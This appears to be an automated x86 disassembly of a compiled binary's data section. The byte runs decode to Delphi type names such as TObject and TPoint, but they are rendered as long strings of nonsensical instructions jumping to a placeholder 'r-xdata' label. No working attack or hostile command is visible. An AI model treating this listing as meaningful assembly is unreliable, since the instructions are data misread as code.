or eax 0x35b008b0
mov al 0x9
mov al 0x23
mov al 0x30
mov al 0xa
mov al 0x13
mov al 0x14
mov al 0x1c
mov al 0x3a
mov al 0x3c
mov al 0x3d
mov al 0x43
mov al 0x7b
add bh ch
inc esp
add [ eax ] bh
inc ecx
add [ ecx + eax ] bl
add [ eax ] ah
movsd [ edi ] [ esi ]
inc ecx
add [ eax + 0x74004035 ] bl
sahf
inc ecx
add [ eax - 0x4fffbfcb ] ah
cmp [ eax + eax - 0x24 ] eax
xor al [ eax ]
clc
xor al [ eax ]
sub [ edi ] dl
jo r-xdata
add [ esp + ebp ] al
inc ebp
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] bl
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
push eax
outsd
jae r-xdata
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] bl
inc eax
add [ eax + 0x54004119 ] ch
adc [ eax ] al
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
dec ebp
outsd
jne r-xdata
adc [ eax ] cl
push esp
push ebx
push 0x53746669
je r-xdata
dec ebp
outsd
jne r-xdata
je r-xdata
add al 0x8
push es
lea eax [ eax ]
pushad
fild [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
fild [ ebx ]
fsub st1
inc ebx
add [ eax ] al
jbe r-xdata
outsb
je r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] bl
inc eax
add [ eax + 0x4119 ] ch
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov esp 0x80043de
adc dl [ ebx + eax * 2 + 0x6f ]
outsb
add [ edi ] eax
dec eax
popad
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
inc esp
add [ eax - 0x77ffbbba ] dl
cmp al [ eax + eax - 0x4c ]
dec ecx
inc ecx
add [ eax + 0x46 ] bl
inc esp
add [ eax ] ah
sbb al [ eax + eax - 0x74 ]
sbb [ eax + eax + 0x38 ] eax
add [ eax ] ch
pop ss
push eax
outsd
jae r-xdata
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
adc [ eax ] cl
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x8 ] si
sub_43d02e
inc ebx
add [ ebp + esi - 0x4c3ffc0 ] cl
inc ebx
add [ ebx + edi * 8 ] ch
inc ebx
add [ eax - 0x6bffbfcb ] ah
xor eax 0x32dc0040
inc eax
add al bh
xor al [ eax ]
xor al 0x33
inc eax
add al cl
sti
inc ebx
add [ eax - 0x4bffbc06 ] bh
cli
inc ebx
add [ eax + 0x700043f9 ] bh
sti
inc ebx
add [ ecx + edi * 8 + 0x43 ] bh
add al dl
cli
inc ebx
add ah dl
cli
inc ebx
add ah bl
cli
inc ebx
add [ ebx + edi * 8 - 0x4b3ffbd ] bl
inc ebx
add [ esi ] dl
push esp
inc edx
popad
jae r-xdata
add [ eax - 0x2f ] al
inc ebx
add [ eax ] al
add [ eax ] al
add al 0xd0
inc esp
jb r-xdata
inc ebx
add [ esp + edi * 8 ] dl
inc ebx
add [ eax + 0x700043f9 ] bh
sti
inc ebx
add [ ecx + edi * 8 + 0x43 ] bh
add [ eax ] ah
cld
inc ebx
add ah dl
inc ebx
outsd
outsb
je r-xdata
inc ebx
add [ ebp + esi - 0x4c3ffc0 ] cl
inc ebx
add [ ebx + edi * 8 ] ch
add [ eax ] al
inc eax
rol [ ebx ] 0x1
inc eax
add [ eax ] al
add [ eax + edx * 8 ] al
inc ebx
outsd
outsb
je r-xdata
inc ebx
add [ eax - 0x2 ] al
inc ebx
add [ edx + edi * 8 - 0x647ffbd ] dh
inc ebx
add al bh
inc ebx
outsd
outsb
je r-xdata
cli
inc ebx
add [ eax - 0x4 ] al
inc ebx
add [ ebx + edi * 8 - 0x4b3ffbd ] bl
inc ebx
add [ esp + edx * 2 ] dl
inc esp
jb r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x60 ] si
rol [ ebx ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
inc ebx
add [ eax - 0x6bffbfcb ] ah
sti
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x68 ] si
rol [ ebx ] 0x1
pop es
push ss
push esp
inc edx
popad
jae r-xdata
inc ebx
add [ ebp + esi - 0x4c3ffc0 ] cl
inc ebx
add [ esi + edi * 8 + 0x43 ] dl
add [ eax - 0x6bffbfcb ] ah
xor eax 0x32dc0040
inc eax
add al bh
xor al [ eax ]
enter 0x43fc 0x0
enter 0x43fb 0x0
inc eax
inc [ ebx ]
mov ah 0xfa
inc ebx
add [ eax - 0x7ffbc07 ] bh
cld
inc ebx
add [ ecx + edi * 8 + 0x43 ] bh
add al dl
cli
inc ebx
add ah dl
cli
inc ebx
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax * 4 - 0x2e ] si
inc ebx
add [ edi ] al
andps xmm0 [ edx + esi * 2 + 0x61 ]
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + esi - 0x2e ] si
inc ebx
add [ eax + edx * 8 + 0x43 ] dl
or [ ebx + 0x6f ] al
outsb
je r-xdata
cli
inc ebx
add ah dl
cli
inc ebx
add ah bl
cli
inc ebx
add [ ebp + edi * 8 + 0x43 ] dl
add [ esp + edi * 8 + 0x43 ] ah
add [ ebp + edi * 8 - 0x1e7ffbd ] bl
inc ebx
add [ esi + edi * 8 ] ch
inc ebx
add [ esi + edi * 8 + 0x43 ] cl
add [ edi ] cl
push esp
inc esp
jb r-xdata
cld
inc ebx
add [ ecx + edi * 8 + 0x43 ] bh
add al dl
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
lea eax [ eax ]
xor dl dl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edx * 8 + 0x43 ] ch
add [ eax ] dh
add [ eax ] al
add al 0xd0
inc ebx
add [ ebp + esi - 0x4c3ffc0 ] cl
inc ebx
add [ ebx + edi * 8 ] ch
inc ebx
add [ eax - 0x6bffbfcb ] ah
xor eax 0x32dc0040
inc eax
add al bh
xor al [ eax ]
enter 0x43fc 0x0
enter 0x43fb 0x0
inc eax
inc [ ebx ]
mov ah 0xfa
inc ebx
add [ eax - 0x7ffbc07 ] bh
xor eax 0x32dc0040
xchg esp eax
inc esp
jb r-xdata
inc ecx
add [ ecx + ecx * 2 - 0x1c6fffbf ] dh
inc ecx
add [ ebx + 0x41 ] bh
add [ eax + 0x10 ] dl
inc esp
add [ esi ] cl
push esp
inc ebx
outsd
outsb
je r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
mov eax eax
nop
rol [ ebx ] cl
add ah bl
cli
inc ebx
add [ ebp + edi * 8 + 0x43 ] dl
add [ esp + edi * 8 + 0x43 ] ah
add [ ebp + edi * 8 - 0x1e7ffbd ] bl
inc ebx
add [ esi + edi * 8 ] ch
inc ebx
add [ esi + edi * 8 + 0x43 ] cl
add [ ecx ] dl
push esp
inc esp
jb r-xdata
outsd
insb
jae r-xdata
inc eax
add al bh
xor al [ eax ]
xor al 0x33
inc eax
add al cl
sti
inc ebx
add ah bh
sti
add [ ebp + esi + 0x32dc0040 ] dl
inc ebx
outsd
outsb
je r-xdata
xor eax 0x32dc0040
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
add [ ebx + 0x43d2f4c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
rol [ ebx ] cl
jo r-xdata
inc ebx
add [ esp + edi * 8 ] dl
inc ebx
add [ eax + 0x700043f9 ] bh
sti
inc ebx
add [ ecx + edi * 8 + 0x43 ] bh
add [ eax ] ah
cld
inc ebx
add ah dl
cli
inc ebx
add [ eax - 0x4 ] al
inc ebx
add [ ebx + edi * 8 - 0x4b3ffbd ] bl
inc ebx
add [ edx ] dl
push esp
inc esp
jb r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 2 - 0x30 ] si
inc ebx
add ah bl
iretd
or esp [ ebp + ebp * 2 + 0x41 ]
jne r-xdata
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x43d4c490
add [ ebx ] al
or al 0x54
inc eax
add al bh
xor al [ eax ]
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
jae r-xdata
add [ eax ] al
in al 0xd1
add [ eax + 0x60043d5 ] cl
outsd
insd
popad
je r-xdata
inc ebx
inc edx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0x43d3
add [ eax ] al
add [ eax ] al
mov esp 0x70043d3
push cs
push esp
inc ebx
outsd
outsb
je r-xdata
inc eax
add [ eax ] dh
salc
inc ebx
add [ esi ] al
or [ ecx + eax * 2 + 0x6e ] dl
arpl [ eax + 0x6f ] bp
jb r-xdata
outsd
add [ eax ] al
arpl [ eax ] cx
inc ebx
outsd
outsb
je r-xdata
push es
je r-xdata
inc esp
jb r-xdata
je r-xdata
inc ecx
add [ esp + edx - 0x598bffbc ] dh
inc ecx
add [ eax + 0x15 ] ah
inc esp
add ah al
movsd [ edi ] [ esi ]
inc ecx
add [ eax - 0x5a ] bl
inc ecx
add [ esi + 0x13a00041 ] ch
inc esp
add [ ebx + ebp * 8 + 0x14140044 ] dl
inc esp
add [ ebx + ebp * 8 - 0x142fffbc ] bh
inc esp
add [ ebp + edx + 0x14480044 ] cl
inc esp
add [ esp + ebp * 8 ] cl
inc esp
add [ eax ] ah
in al dx
inc esp
add [ eax + 0x48004414 ] al
in al dx
inc esp
add ah bl
adc al 0x44
add [ eax - 0x14 ] dl
inc esp
add ah bh
adc al 0x44
add [ eax - 0x14 ] bl
inc esp
add [ eax ] dl
push ss
inc esp
add al dh
adc eax 0x16300044
inc esp
add [ edx - 0x1393ffbc ] bl
inc esp
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
adc [ eax + eax - 0x60 ] eax
dec edx
add esp esp
aad 0x43
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edx * 8 + 0x640b0043 ] bh
jae r-xdata
rcl ch 0x43
add [ ecx ] al
or [ esp + edx * 2 + 0x61 ] edx
imul eax [ fs : edi + ebp * 2 + 0x63 ] 0x6b
popad
outsd
insb
jae r-xdata
outsb
je r-xdata
imul ecx [ eax ] 0x43
outsd
inc esp
jb r-xdata
push ebx
je r-xdata
add ecx [ edx ]
push esp
outsb
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add al al
aam 0x43
add [ esi ] al
insd
bound ecx [ ebp + 0x66 ]
je r-xdata
or al 0xa6
inc ecx
add [ edx + edx - 0x59bfffbc ] dl
jae r-xdata
dec ebp
popad
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jb r-xdata
imul eax [ fs : edx + esi * 2 + 0x61 ] 0x67
aad 0x43
add [ esi ] al
jb r-xdata
dec ebp
outsd
jne r-xdata
push esp
add [ ebx ] al
or dl [ esp + eax * 2 + 0x72 ]
popad
rol [ eax - 0x2b ] 0x43
imul edx [ edi + ebp * 2 + 0x70 ] 0x7
push es
or [ ebp + 0x62 ] ch
dec ebp
imul esp [ esp + 0x6c ] 0x6f430865
outsb
je r-xdata
insd
bound edx [ edx + 0x69 ]
push 0x626d0874
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x640043d3 ] ch
add [ eax ] al
add ah cl
mov ebx 0x358c0041
inc eax
add [ eax - 0x63ffbfcb ] bl
xor eax 0x35a00040
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
and al 0x10
inc esp
add [ eax - 0x5fffbeb6 ] bl
dec edx
rol [ ebx ] cl
cmp [ ecx + eax * 2 + 0x8000400 ] bh
inc ebx
outsd
outsb
je r-xdata
jne r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
adc [ eax ] al
add bh bh
hlt
je r-xdata
inc ebx
outsd
outsb
jae r-xdata
hlt
inc ebx
outsd
outsb
jae r-xdata
push esp
push ebx
imul edi [ edx + 0x65 ] 0x736e6f43
je r-xdata
add [ eax - 0x4bffbeb6 ] ah
dec ecx
inc ecx
add [ eax + 0x70004412 ] al
adc [ eax + eax + 0x10 ] eax
imul ebp [ esi + 0x74 ] 0x657a6953
bound ecx [ edi + 0x72 ]
jb r-xdata
add [ ecx ] ecx
push esp
push esp
popad
inc ebp
outsb
je r-xdata
inc ecx
add [ ecx + ecx * 2 + 0x12800041 ] dh
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
outsd
insd
or [ ebx + 0x6f ] al
outsb
je r-xdata
jbe r-xdata
outsd
insb
jae r-xdata
inc ecx
add [ eax - 0x6bffbbed ] ah
jmp r-xdata
outsd
insb
jae r-xdata
push esp
dec ebp
outsd
inc ebp
jbe r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x43d64074
jb r-xdata
popad
js r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
inc eax
add al bh
xor al [ eax ]
mov [ ecx + 0x41 ] cl
add [ ecx + edx + 0x4aa00044 ] ch
mov al [ 0xffffffff94004035 ]
xor eax 0x32dc0040
outsd
insb
inc ebx
add [ edx ] cl
or [ ebx + eax * 2 + 0x61 ] dl
or ah [ ebx + esi * 2 + 0x44 ]
jb r-xdata
or [ esp + eax * 2 + 0x72 ] edx
popad
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
aad 0x43
add [ ebx ] al
add [ eax - 0x14 ] dh
inc esp
add [ eax + 0x15 ] al
inc esp
add [ eax + 0x12004412 ] dh
push esp
inc ebx
outsd
outsb
je r-xdata
add [ esp + ebp * 8 + 0x44 ] ch
add [ ebp - 0x2bcfffc0 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edx * 8 + 0x1c0043 ] ch
add [ eax ] al
lodsb [ esi ]
in al 0x44
add [ ebp + esi + 0x35980040 ] cl
inc eax
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ebp
outsd
jbe r-xdata
jne r-xdata
inc eax
add [ ebx + 0x43d80cc0 ] cl
outsb
je r-xdata
arpl [ gs : eax + eax + 0x5 ] si
je r-xdata
pop es
add [ eax + eax ] dl
add bh bh
hlt
salc
salc
inc ebx
add [ eax ] dl
add [ eax ] al
push esp
adc [ eax + eax + 0x1 ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ ecx ] cl
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
je r-xdata
imul ebp [ esi + 0x74 ] 0x43d6ac73
add [ ecx + 0x41 ] dl
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] cl
imul ebp [ esi + 0x74 ] r-xdata
fcom st6
inc ebx
add [ edi ] al
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jae r-xdata
jb r-xdata
jpe r-xdata
imul ebp [ edi + 0x6e ] 0xd5e8c08b
inc ebx
add [ ebx ] al
jo r-xdata
or cl [ eax ]
push esp
inc ebx
popad
dec ebp
outsd
jbe r-xdata
add [ ecx ] al
add [ eax ] al
lea eax [ eax ]
mov ebp ss
inc ebx
add [ ebx ] al
or [ esp + eax * 2 + 0x72 ] edx
popad
insb
add [ 0x66696853 ] al
je r-xdata
push edi
outsd
jb r-xdata
or [ esi ] al
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
push 0x53746669
je r-xdata
je r-xdata
push ebx
push 0xb746669
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
inc ebx
outsd
insb
jae r-xdata
or [ ebx + 0x6f ] al
imul eax [ edi + ebp * 2 + 0x63 ] 0x6b
jb r-xdata
jae r-xdata
insb
jae r-xdata
inc esp
add [ eax + 0x11 ] dh
inc esp
add [ eax ] dl
add eax 0x0
add [ eax + r-xdata ] dl
add [ edi ] ecx
push esp
inc ebx
outsd
outsb
jae r-xdata
inc ebx
imul ebp [ esi + 0x64 ] 0x1
or edx [ ecx + eax * 2 + 0x6e ]
arpl [ eax + 0x6f ] bp
jb r-xdata
outsb
mov eax eax
call 0x34419be
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ ecx + edx ] bl
inc eax
add [ eax - 0x57ffbff0 ] al
sbb [ ecx ] eax
nop
push esp
push ebx
inc esp
jb r-xdata
dec ebx
jns r-xdata
add [ ebx ] eax
outsb
jb r-xdata
outsb
je r-xdata
inc edx
jne r-xdata
add [ esi ] al
push esp
dec edi
push es
or [ esi ] al
push ebx
outsb
je r-xdata
popad
add [ ecx ] al
je r-xdata
inc edx
jne r-xdata
add [ eax ] cl
add [ eax ] al
push esp
adc [ eax + eax + 0x1 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] cl
dec ebp
popad
js r-xdata
add [ eax - 0x2a ] al
inc ebx
dec esp
popad
inc edx
outsd
je r-xdata
or [ ecx + 0x6b ] ah
popad
imul edx [ edx + 0x69 ] 0x67
push 0x6b610874
add [ ebx ] al
add [ eax ] al
add ah ah
aad 0x43
add [ esi ] al
popad
imul ecx [ ebp + 0x66 ] 0x74
add eax 0x6f546b61
jo r-xdata
add [ fs : eax ] eax
add [ eax ] al
outsd
insb
jae r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
popad
outsb
add [ ecx + edx ] bl
inc eax
add [ ecx + edx ] bl
dec edi
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
push ebx
outsd
jne r-xdata
or [ esi ] al
jb r-xdata
mov esp 0x80043d8
adc [ eax ] 0x40
add [ eax - 0x6fffbee7 ] ch
jb r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
imul esp [ edi + 0x68 ] 0x43d64074
imul esp [ gs : edi + 0x68 ] 0x43d64074
add [ eax + eax ] cl
add bh bh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
aad 0x43
add [ eax ] cl
insd
dec ebp
popad
outsb
jne r-xdata
inc eax
add [ ebp + edx * 8 + 0x9030043 ] cl
push esp
inc esp
jb r-xdata
or [ esi ] al
arpl [ ebp + 0x7 ] sp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
add [ ecx ] al
jae r-xdata
je r-xdata
inc esp
jb r-xdata
inc eax
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ edx * 8 + 0x10000043 ] bh
inc eax
add [ eax + r-xdata ] dl
or [ esi ] cl
sbb al 0x11
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
add [ ecx + 0x7 ] ebx
dec ecx
outsb
pop eax
pop es
or edx [ ebx + edx * 2 + 0x68 ]
outsb
add [ 0x66696853 ] al
je r-xdata
outsb
dec ebx
imul ebp [ esi + 0x64 ] 0x1
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
inc esp
jb r-xdata
jbe r-xdata
push cs
inc ebx
add [ eax ] cl
jb r-xdata
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
arpl [ ebp + 0x7 ] sp
push esp
dec edi
add [ ecx + 0x7 ] ebx
dec ecx
jb r-xdata
outsb
je r-xdata
outsb
je r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
popad
jb r-xdata
inc ebp
jbe r-xdata
or [ edx ] ecx
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
push esp
adc [ eax ] al
push esp
adc [ eax ] al
lea eax [ eax ]
loopne r-xdata
jbe r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
push ebx
je r-xdata
push esp
inc esp
jb r-xdata
push esp
adc [ eax ] al
push esp
adc [ eax ] al
cmp al 0xd5
inc ebx
add [ eax ] al
adc [ eax ] al
nop
sbb cl 0x43
add [ eax ] cl
push cs
outsb
je r-xdata
sbb al 0x11
inc eax
add [ eax + 0x54004119 ] ch
adc [ eax ] al
push esp
adc [ eax ] al
lea eax [ eax ]
jo r-xdata
je r-xdata
jb r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
je r-xdata
sbb al 0x11
inc eax
add ah bl
iretd
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
outsb
je r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
outsb
je r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
outsb
je r-xdata
outsb
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx + 0x54 ] si
inc esp
jb r-xdata
outsb
je r-xdata
inc ebx
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
popad
jb r-xdata
or [ esi ] al
outsb
je r-xdata
je r-xdata
je r-xdata
dec ecx
outsb
inc ebx
add [ eax ] cl
or [ ebx + ecx * 2 + 0x65 ] edx
jns r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ebx ] eax
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
je r-xdata
jb r-xdata
pop eax
add [ ecx ] al
push esp
dec edi
jb r-xdata
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
jb r-xdata
adc [ eax ] eax
push esp
adc [ eax ] al
push esp
adc [ eax ] al
test dl bl
inc ebx
add [ eax ] cl
push cs
jb r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1c ] si
adc [ eax ] eax
fmul st7
inc ebx
add [ eax ] ch
fiadd [ ebx ]
or [ 0x646e4554 ] cl
inc esp
pop es
dec ecx
outsb
je r-xdata
inc esp
push ebx
outsb
add al 0x8
push es
dec ecx
add [ eax + 0x7 ] ebx
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
push esp
dec ebx
jns r-xdata
or [ esi ] cl
jbe r-xdata
je r-xdata
jb r-xdata
push esp
inc ebp
outsb
jb r-xdata
add [ ecx + edx ] bl
inc eax
add [ eax ] ch
adc [ eax ] al
lea eax [ eax ]
clc
fadd [ ebx ]
or [ esi ] cl
push esp
inc ebx
push 0x1c007261
adc [ eax ] eax
sub [ eax ] dl
inc eax
add [ ebp - 0x2707ffc0 ] cl
inc ebx
add [ eax ] cl
push cs
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
or [ esi ] al
push esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
sbb al 0x11
inc eax
add [ edx + edx * 8 + 0x43 ] bh
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebp - 0x2513ffc0 ] cl
inc ebx
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
push esp
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
sbb al 0x11
inc eax
add [ ecx + edx ] bl
inc eax
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ edx + ebx * 8 + 0xe080043 ] al
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
jo r-xdata
adc [ eax ] eax
pop es
inc edx
outsd
outsd
insb
outsb
je r-xdata
add [ eax ] cl
andps xmm1 [ ebp + 0x6f ]
sbb al 0x11
inc eax
add al al
aam 0x43
add [ eax + 0x54004119 ] ch
adc [ eax ] al
push esp
adc [ eax ] al
mov eax eax
or al 0xd8
inc ebx
sbb al 0x11
inc eax
add [ ecx + edx ] bl
inc eax
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebp - 0x261fffc0 ] cl
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
inc esp
outsd
or [ esi ] al
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
popad
outsb
add [ ecx + edx ] bl
jb r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jbe r-xdata
push ebx
add ecx [ eax ]
push es
or [ esp + edx * 2 ] cl
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
inc esp
outsd
inc esp
outsd
insb
jb r-xdata
popad
outsb
je r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
je r-xdata
jbe r-xdata
jbe r-xdata
inc ebp
jb r-xdata
inc ebx
add [ esp + ebx * 8 ] dh
inc ebx
add [ eax ] cl
adc [ edi + eax * 2 + 0x65 ] edx
je r-xdata
push 0x65
popad
jb r-xdata
je r-xdata
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
or [ ecx ] cl
dec esi
ja r-xdata
je r-xdata
inc eax
add [ edx + edx * 8 + 0x43 ] bh
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ edx * 8 + 0x10000043 ] bh
inc eax
add [ eax + r-xdata ] dl
sbb al 0x11
outsb
je r-xdata
inc esp
jb r-xdata
or [ edx ] ecx
arpl [ ecx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61430701
imul esi [ ebp + 0x49 ] 0x456f666e
jbe r-xdata
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edi + ecx + 0x54 ] si
inc esp
jb r-xdata
je r-xdata
jne r-xdata
adc [ 0x6c666e49 ] ecx
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
rcr ah 0x43
add [ eax ] cl
andps xmm0 [ ebx + 0x61 ]
outsb
push edx
jae r-xdata
aam 0xe1
inc ebx
outsb
je r-xdata
pop es
outsb
arpl [ ebp + 0x52 ] sp
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + edx + 0x8 ] si
dec ebp
outsd
